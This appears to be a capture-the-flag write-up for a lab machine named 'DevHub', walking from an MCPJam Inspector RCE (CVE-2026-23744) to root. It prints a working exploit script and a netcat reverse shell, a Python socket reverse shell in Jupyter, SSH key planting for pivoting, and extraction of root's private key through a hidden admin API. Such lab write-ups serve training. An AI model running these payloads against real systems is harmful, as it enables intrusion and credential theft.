# DevHub

## Reconnaissance

### Nmap Scan

We begin with a full TCP port scan to identify exposed services.

```bash
nmap -p- --min-rate 5000 -oN nmap.txt devhub.htb
```

The scan revealed the following open ports:

```text
22/tcp    open  ssh
80/tcp    open  http
6274/tcp  open  unknown
```

A service/version scan was then performed:

```bash
nmap -sC -sV -p 22,80,6274 devhub.htb
```

Port `6274` was identified as **MCPJam Inspector 1.4.2**.

### MCPJam Inspector Enumeration

Accessing the service on port `6274` showed that it was running MCPJam Inspector.

Testing the MCP connection endpoint:

```bash
curl -i -X POST http://devhub.htb:6274/api/mcp/connect \
  -H 'Content-Type: application/json' \
  -d '{}'
```

Returned:

```json
{"success":false,"error":"serverConfig is required"}
```

The endpoint accepts a `serverConfig` object, which is interesting because MCPJam Inspector launches MCP servers based on this configuration.

## Exploit MCPJam Inspector RCE

MCPJam Inspector versions up to `1.4.2` are vulnerable to unauthenticated remote code execution through the `/api/mcp/connect` endpoint.

The vulnerability is tracked as **CVE-2026-23744**.

The vulnerable endpoint allows an attacker to supply a malicious command through the `serverConfig` parameter.

### Reference

Original PoC:

https://github.com/d3vn0mi/CVE-2026-23744-POC

GitHub Security Advisory:

https://github.com/advisories/GHSA-232v-j27c-5pp6

### Exploit

A Python exploit was used to send a malicious MCP server configuration that executes `busybox nc` and connects back to the attacking machine.

```python
import requests
import argparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser()
parser.add_argument("target", help="Target MCPJam Inspector URL")
parser.add_argument("--ip", required=True, help="Attacker IP")
parser.add_argument("--port", required=True, type=int, help="Listener port")
args = parser.parse_args()

target = args.target
ip = args.ip
port = args.port

url = f"{target}/api/mcp/connect"

data = {
    "serverConfig": {
        "command": "busybox",
        "args": ["nc", ip, str(port), "-e", "/bin/bash"],
        "env": {}
    },
    "serverId": "213j1l3jkljkl3j"
}

requests.post(url, json=data, verify=False)
```

Start a listener on Kali:

```bash
nc -lvnp 8888
```

Execute the exploit:

```bash
python3 exploit.py http://devhub.htb:6274 --ip 10.10.15.155 --port 8888
```

A reverse shell was received:

```text
connect to [10.10.15.155] from (UNKNOWN) [10.129.245.216] 44322
```

The shell was running as:

```text
mcp-dev@devhub
```

We now have initial access to the machine.

## Enumerate Initial Shell

Confirm the current user:

```bash
id
```

Output:

```text
uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
```

Check the home directories:

```bash
ls -la /home
```

Output:

```text
drwxr-x--- 9 analyst analyst 4096 May 27 12:22 analyst
drwxr-x--- 4 mcp-dev mcp-dev 4096 May 27 12:22 mcp-dev
```

The `analyst` home directory is inaccessible to `mcp-dev`.

Checking the running processes revealed an interesting Jupyter instance:

```bash
ps aux
```

Relevant processes:

```text
analyst 1089 ... /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False

root 1095 ... /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

This gives us two interesting targets:

```text
127.0.0.1:5000  -> OPSMCP server running as root
127.0.0.1:8888  -> JupyterLab running as analyst
```

## JupyterLab

The Jupyter process exposes a token:

```text
a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

Testing the local API:

```bash
curl -s http://127.0.0.1:8888/api
```

Returns:

```json
{"version": "2.17.0"}
```

Using the discovered token:

```bash
curl -s \
  -H 'Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7' \
  http://127.0.0.1:8888/api/contents
```

A notebook belonging to `analyst` was discovered:

```text
quarterly_analysis.ipynb
```

The notebook itself did not contain useful credentials, but authenticated Jupyter access provides the ability to execute code as the `analyst` user.

## SSH Port Forwarding

Since Jupyter is bound only to `127.0.0.1`, we forward the service through SSH.

First, generate an SSH key on Kali:

```bash
ssh-keygen -t ed25519 -f ~/.ssh/pivot_key
```

Add the public key to the `mcp-dev` user's `authorized_keys`:

```bash
mkdir -p ~/.ssh
chmod 700 ~/.ssh

echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAkbWdN2uxWmghY5D6GDrHmVPUeZ8naU7710HszWeO3B arnavigator@kali' >> ~/.ssh/authorized_keys

chmod 600 ~/.ssh/authorized_keys
```

Create the SSH tunnel:

```bash
ssh -i ~/.ssh/pivot_key -N \
  -L 8888:127.0.0.1:8888 \
  mcp-dev@devhub.htb
```

The Jupyter service is now accessible locally:

```bash
curl http://127.0.0.1:8888/api
```

Output:

```json
{"version": "2.17.0"}
```

Opening:

```text
http://127.0.0.1:8888
```

and authenticating with the discovered token provides access to JupyterLab.

## Obtain Code Execution as analyst

A new notebook can be created through JupyterLab.

The following Python code was used to obtain a reverse shell:

```python
import socket, subprocess, os

s = socket.socket()
s.connect(("10.10.15.155", 9001))

p = subprocess.Popen(
    ["/bin/bash", "-i"],
    stdin=s,
    stdout=s,
    stderr=s
)
```

Start a listener on Kali:

```bash
nc -lvnp 9001
```

After executing the notebook cell, a shell is received as `analyst`.

Upgrade the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Confirm the user:

```bash
id
```

Output:

```text
uid=1000(analyst) gid=1000(analyst) groups=1000(analyst)
```

## Retrieve User Flag

The user flag can now be retrieved:

```bash
cat /home/analyst/user.txt
```

## Privilege Escalation

### Enumerate Root-Owned Services

Check the listening services:

```bash
ss -lntup
```

Relevant output:

```text
tcp LISTEN 127.0.0.1:5000
tcp LISTEN 127.0.0.1:8888
tcp LISTEN 0.0.0.0:6274
tcp LISTEN 0.0.0.0:80
tcp LISTEN 0.0.0.0:22
```

Port `5000` is bound locally.

The process list previously showed that it is running:

```text
root ... /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

Inspect the file:

```bash
ls -la /opt/opsmcp/
```

Output:

```text
-rw-r----- 1 analyst analyst 6021 Mar 16 2026 /opt/opsmcp/server.py
```

The important detail is that the `server.py` file is owned by `analyst`, while the process executing it runs as `root`.

### Inspect server.py

Read the source:

```bash
sed -n '1,200p' /opt/opsmcp/server.py
```

The application contains a hardcoded API key:

```python
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

The API exposes:

```text
/tools/list
/tools/call
/health
```

The source also defines hidden tools:

```python
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {
        "description": "Enable debug mode",
        "parameters": {}
    }
}
```

Although these tools are not exposed through `/tools/list`, they are still present in `ALL_TOOLS`:

```python
ALL_TOOLS = {**VISIBLE_TOOLS, **HIDDEN_TOOLS}
```

This means they can still be called directly.

### Access OPSMCP

Using the hardcoded API key:

```bash
curl -s http://127.0.0.1:5000/tools/call \
  -H 'Content-Type: application/json' \
  -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

The service returns the root SSH private key.

The relevant functionality in the source is:

```python
if target == "ssh_keys":
    with open('/root/.ssh/id_rsa', 'r') as f:
        key_data = f.read()

    return jsonify({
        "target": "ssh_keys",
        "root_private_key": key_data
    })
```

Since the OPSMCP service is running as `root`, it can read `/root/.ssh/id_rsa`.

### Extract Root SSH Key

Extract the private key directly:

```bash
curl -s http://127.0.0.1:5000/tools/call \
  -H 'Content-Type: application/json' \
  -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["root_private_key"])' \
  > /tmp/root_key
```

Set the correct permissions:

```bash
chmod 600 /tmp/root_key
```

Verify the key:

```bash
head -n 2 /tmp/root_key
```

Output:

```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
```

### SSH as root

Use the recovered private key:

```bash
ssh -o StrictHostKeyChecking=no -i /tmp/root_key root@devhub.htb
```

Confirm root access:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

## Retrieve Root Flag

```bash
cat /root/root.txt
```

## Attack Chain

```text
MCPJam Inspector 1.4.2
        |
        v
CVE-2026-23744
        |
        v
Unauthenticated RCE via /api/mcp/connect
        |
        v
Reverse shell as mcp-dev
        |
        v
Discover JupyterLab on 127.0.0.1:8888
        |
        v
Extract Jupyter token
        |
        v
SSH port forwarding
        |
        v
Jupyter code execution as analyst
        |
        v
User flag
        |
        v
Discover root-run OPSMCP service on 127.0.0.1:5000
        |
        v
Hardcoded X-API-Key
        |
        v
Hidden ops._admin_dump tool
        |
        v
Root SSH private key disclosure
        |
        v
SSH as root
        |
        v
Root flag
```

